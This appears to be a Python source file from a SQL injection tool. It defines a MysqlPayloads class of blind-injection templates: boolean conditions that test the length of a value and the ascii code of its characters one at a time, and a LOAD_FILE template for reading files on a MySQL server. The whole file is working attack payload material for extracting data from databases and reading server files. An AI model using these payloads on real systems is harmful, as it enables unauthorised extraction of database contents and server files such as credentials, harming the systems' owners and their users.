class MysqlPayloads:

    and_size_eq = "AND LENGTH({}) = {}"
    and_size_lt = "AND LENGTH({}) < {}"
    and_size_gt = "AND LENGTH({}) > {}"

    and_char_at_is = "AND ascii(SUBSTRING({}, {},1)) = {}"
    and_char_at_lt = "AND ascii(SUBSTRING({}, {},1)) < {}"
    and_char_at_gt = "AND ascii(SUBSTRING({}, {},1)) > {}"

    str_file = "(LOAD_FILE({}))"



